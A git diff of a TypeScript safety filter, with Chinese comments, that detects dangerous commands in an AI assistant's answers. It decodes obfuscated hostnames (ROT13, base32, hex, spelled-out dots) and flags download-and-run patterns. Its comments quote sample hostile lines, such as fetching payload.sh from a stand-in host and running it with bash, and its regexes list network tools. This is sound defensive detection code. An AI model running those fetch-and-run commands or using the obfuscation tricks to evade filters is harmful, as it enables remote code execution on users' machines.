   // 括号（含全角/花/尖）包裹的分隔词：[.] (.) {.} [dot] （点） [at] [:] [/] 等
@@ -2881,8 +3043,55 @@ function foldDefangedSeparators(input: string): string {
   return t;
 }
 
+/**
+ * R306 P0-2（audit-r305 §2：B03/B04 全裸露）：「先解码再当地址」的 token 面。
+ * ROT13 / 倒序 / base32 / hex 都是可逆变换：对每个点分 ASCII token 逆变换一次，
+ * 只在结果落回「带公共 TLD 的主机名」时采信——变换后不是地址就不是还原面，
+ * 故不会把普通标识符/文件名凭空变成域名。
+ */
+export function decodeAddressTokenSurface(text: string): string {
+  const plausible = (s: string): boolean => {
+    if (!/^[a-z0-9.-]{4,80}$/i.test(s)) return false;
+    const labels = s.toLowerCase().split(".");
+    if (labels.length < 2 || labels.some((l) => l.length === 0)) return false;
+    return COMMON_TLDS.has(labels[labels.length - 1]);
+  };
+  return text.replace(/[A-Za-z0-9][A-Za-z0-9.=-]{3,79}/g, (tok) => {
+    if (plausible(tok)) return tok;
+    const cands = [rot13(tok), [...tok].reverse().join("")];
+    if (/^[A-Z2-7]{8,}={0,6}$/.test(tok)) {
+      try {
+        cands.push(decodeBase32(tok));
+      } catch {
+        /* 非法 base32：不是还原面 */
+      }
+    }
+    if (/^[0-9a-f]{8,}$/i.test(tok) && tok.length % 2 === 0) cands.push(decodeHex(tok));
+    for (const c of cands) if (plausible(c)) return c;
+    return tok;
+  });
+}
+
+// 同一段文本在一次 finalize 内会被多个门（语义/组合/降级/资料面）反复归一
+// （CPU 剖析：normalizeAddressSurface 占 finalize 54%），纯函数按输入做小容量
+// 记忆化；容量有界，Worker 隔离内不会累积。
+const ADDR_SURFACE_MEMO = new Map<string, string>();
+const ADDR_SURFACE_MEMO_MAX = 128;
+
 /** 地址判定面的确定性归一（仅判定用，不改用户可见文本）。 */
 export function normalizeAddressSurface(text: string): string {
+  const hit = ADDR_SURFACE_MEMO.get(text);
+  if (hit !== undefined) return hit;
+  const out = normalizeAddressSurfaceUncached(text);
+  if (ADDR_SURFACE_MEMO.size >= ADDR_SURFACE_MEMO_MAX) {
+    const first = ADDR_SURFACE_MEMO.keys().next().value;
+    if (first !== undefined) ADDR_SURFACE_MEMO.delete(first);
+  }
+  ADDR_SURFACE_MEMO.set(text, out);
+  return out;
+}
+
+function normalizeAddressSurfaceUncached(text: string): string {
   // R302 P0-3：类折叠先在**原始面**做一遍——部分分隔符（U+FFE3 等）的 NFKC
   // 兼容分解是「空格+组合符」，先归一会把分隔符信息丢成空白，折不回点。
   const raw = foldDefangedSeparators(text);
@@ -2899,13 +3108,12 @@ export function normalizeAddressSurface(text: string): string {
   }
   // R302 P0-3：字符串拼接（"exam"+"ple.com"）在判定面合拢——引号+加号+引号
   // 的连接只是表层语法，拼接结果才是投放物。
-  s = s.replace(/["'`]\s*\+\s*["'`]/g, "");
-  // R302 P0-3：模板占位符（`${H}.com`）折为定长标签——占位符值不可解析，但
-  // 「占位符.公共TLD」这一形态本身就是地址模板，判定面按域名对待。
-  s = s.replace(/\$\{[^}\n]{1,32}\}/g, "x");
+  s = foldLiteralConcat(s);
   // 拼读还原：dot/点/句点 → 「.」，slash/斜杠 → 「/」，at/艾特 → 「@」
+  // 多语言分隔词 + 插词容忍（两侧限标签字符，R306 P0-2）
+  s = foldSepWords(s);
   s = s
-    .replace(/[ \t]*(?:\bdot\b|点|點|句点|句點)[ \t]*/gi, ".")
+    .replace(/[ \t]*(?:\bdot\b|点|點|句点|句點|句号|句號)[ \t]*/gi, ".")
     .replace(/[ \t]*(?:\bslash\b|斜杠|斜線)[ \t]*/gi, "/")
     .replace(/[ \t]*(?:艾特|小老鼠)[ \t]*/gi, "@")
     .replace(/[·．・｡]/g, ".")
@@ -2916,6 +3124,7 @@ export function normalizeAddressSurface(text: string): string {
   // 良性中文顿号列表折出的 CJK 标签不带公共 TLD，域名判定天然不命中。
   // 两侧限 ASCII 字母数字：可解析域名的标签面本就是 ASCII，CJK 正文里的
   // 句读（「开会，12:30」）不应折成分隔点。
+  s = foldSepWords(s);
   s = foldDefangedSeparators(s);
   // 逐字空格合并（`e v i l . c o m` / `1 9 8 . 5 1 …`）
   s = s
@@ -3153,6 +3362,10 @@ export function execSemanticDangerReason(text: string): string | null {
   // 远程脚本路径 + 同句「取回 + 解释器」：`curl http://h/p.sh 再 sh`——无需出现
   // 「执行」字面，拿远程脚本交给解释器本身就是执行。
   if (s.scriptFetchInterpSameSentence) return "semantic-danger:script-fetch+interp";
+  // R306 P0-2（SP2/B04：地址与脚本名分写——「relay3 点 example 点 net 上的
+  // payload.sh 下下来用 bash 跑」）：远端地址 + 脚本文件名 + 取回 + 解释器同句，
+  // 与「远程脚本路径 + 取回 + 解释器」是同一投放语义，只是地址与路径拆开写。
+  if (s.remoteAddr && s.scriptFileFetchInterpSameSentence) return "semantic-danger:remote+script-fetch+interp";
   // 把壳/解释器交给远端地址（反连方向）：不要求取回语义。
   if (s.handoffInterp && (s.reverseShell || s.fetch || s.run || SEM_CONNECT_RE.test(text)))
     return "semantic-danger:handoff-interp-to-remote";
@@ -3610,11 +3823,41 @@ export function degradedLocalCodeLineExempt(line: string): boolean {
     return false;
   const n = normalizeCommandText(line);
   if (line.includes(LINK_REMOVED_MARK)) return false;
-  if (hasRemoteEndpointForm(line) || hasRemoteEndpointForm(n)) return false;
+  // R306 P0-3/P0-4（audit-r305 §4 LC19/LC20）：只读探测（`curl -I` / `wget --spider` /
+  // `dig` / `ping`）带远端地址但无取回落盘、无管道/重定向/汇入——没有任何字节
+  // 进入本机执行面，与本地命令同级；危险痕迹/取码执行链命中的行照旧不豁免。
+  const probe = isReadOnlyProbeLine(line);
+  if (!probe && (hasRemoteEndpointForm(line) || hasRemoteEndpointForm(n))) return false;
   if (execDegradedTraceReason(judgeSurfaceText(line)) !== null) return false;
   if (execDegradedTraceReason(line) !== null) return false;
   if (fetchThenRunReason(line) !== null) return false;
+  if (execSemanticTraceReason(line) !== null) return false;
   return true;
+}
+
+/**
+ * 语义门（取回 + 解释器 / 地址 + 外传 / 拼字 / 解码即跑…）作为确定性痕迹：
+ * 数据面 noteContainsExecutableCommand 以它为准，出口否决/降级残留/资料面
+ * 良性判定须与数据面同口径——否则「卡片标危险、答案照抄原文」（R305 T04
+ * printf 八进制拼主机名：散文形态无代码行、无地址面，只有语义门留痕）。
+ */
+export function execSemanticTraceReason(text: string): string | null {
+  if (!text.trim()) return null;
+  return execSemanticGateReason(text) ?? execSemanticGateReason(judgeSurfaceText(text));
+}
+
+const READ_ONLY_PROBE_RE =
+  /^\s*(?:\$\s*)?(?:sudo\s+)?(?:curl\s+(?:-[a-zA-Z]*I[a-zA-Z]*|--head)\b|wget\s+--spider\b|ping6?\b|traceroute6?\b|tracepath\b|mtr\b|dig\b|nslookup\b|host\b|whois\b|nc\s+-[a-z]*z[a-z]*\b|openssl\s+s_client\b|ssh-keyscan\b|nmap\s+-s[nP]\b)/i;
+const PROBE_FORBID_RE =
+  /[|;&`<>]|\$\(|\$\{|\s-(?:o|O|d|F|T|X|u|K|E|c)\b|--(?:output|data|upload-file|form|request|config|user|cookie|header|remote-name|post-data|post-file)\b|\.(?:sh|bash|py|ps1|pl|rb|exe|bin|run|tgz)\b/i;
+
+/** 单行只读探测命令（无取回落盘/管道/重定向/汇入/请求体）。 */
+export function isReadOnlyProbeLine(line: string): boolean {
+  const l = line.trim();
+  if (!READ_ONLY_PROBE_RE.test(l)) return false;
+  if (PROBE_FORBID_RE.test(l)) return false;
+  // 命令后只允许跟散文注释（CJK/空格/标点），不允许第二条命令
+  return !/\n/.test(l);
 }
 
 /**
@@ -3735,7 +3978,9 @@ export function proseSentenceSpans(
 ): Array<{ start: number; end: number }> | null {
   const lineText = text.slice(lb.start, lb.end);
   if (!/[。！？]/.test(lineText)) return null;
-  const parts = lineText.split(/(?<=[。！？])/).filter((p) => p.length > 0);
+  // 两侧紧贴标签字符的「。」是去牙地址的点（evil。example。com），不是句号：
+  // 在这里切句会把地址前半段当无关句保留、只隔离尾句（audit-r305 §3 部分回显）。
+  const parts = lineText.split(/(?<=[。！？])(?<![A-Za-z0-9]。(?=[A-Za-z0-9]))/).filter((p) => p.length > 0);
   if (parts.length < 2) return null;
   const out: Array<{ start: number; end: number }> = [];
   let pos = lb.start;
@@ -4737,7 +4982,8 @@ export function finalizeAskAnswer(
       globalExecDangerReason(answer) ??
       execDegradedTraceReason(judgeSurfaceText(answer)) ??
       execDegradedTraceReason(answer) ??
-      execCombinationGateReason(answer);
+      execCombinationGateReason(answer) ??
+      execSemanticTraceReason(answer);
     if (veto !== null) opts = { ...opts, execConservativeVeto: true };
   }
   // R298 P1-2（audit-r297 §3，降级态 34/132 = 25.8% 良意误伤）：R296 在这里直接
@@ -5210,7 +5456,8 @@ export function finalizeAskAnswer(
         execDegradedTraceReason(answer) ??
         execDegradedTraceReason(judgeSurfaceText(out)) ??
         execDegradedTraceReason(out) ??
-        execCombinationGateReason(answer);
+        execCombinationGateReason(answer) ??
+        execSemanticTraceReason(answer);
     const installerExempt = !opts.execClassifierUnavailable && out.includes(EXEC_INSTALLER_WARN_MARK);
     // 不可用态下宽判据命中即整答隔离，**不因上游已做过局部隔离而豁免**：分片型
     // 载体（如 E08 跨笔记拆字）局部隔离只吞掉带痕迹的那一片，其余片段单看无痕
@@ -5313,7 +5560,8 @@ function dataSurfaceFullyBenign(dataText: string): boolean {
     execSemanticDangerReason(judgeSurfaceText(l)) !== null ||
     globalExecDangerReason(l) !== null ||
     execDegradedTraceReason(judgeSurfaceText(l)) !== null ||
-    execDegradedTraceReason(l) !== null;
+    execDegradedTraceReason(l) !== null ||
+    execSemanticTraceReason(l) !== null;
   // 整体判定只取跨行聚合有意义的判面（外传劝导 / 危险执行语义——跨笔记
   // 分片 P1-2 靠它们兜住）。execDegradedTraceReason 是降级态给**单段代码**用的
   // 粗判（code+hostport+proc 三信号共现），拿整个多笔记资料面喂它必然共现
@@ -5323,7 +5571,8 @@ function dataSurfaceFullyBenign(dataText: string): boolean {
     conductSignal(dataText) ||
     execSemanticDangerReason(dataText) !== null ||
     execSemanticDangerReason(judgeSurfaceText(dataText)) !== null ||
-    globalExecDangerReason(dataText) !== null;
+    globalExecDangerReason(dataText) !== null ||
+    execSemanticTraceReason(dataText) !== null;
   return !wholeDangerous && !lines.some((l) => dangerous(l));
 }
 
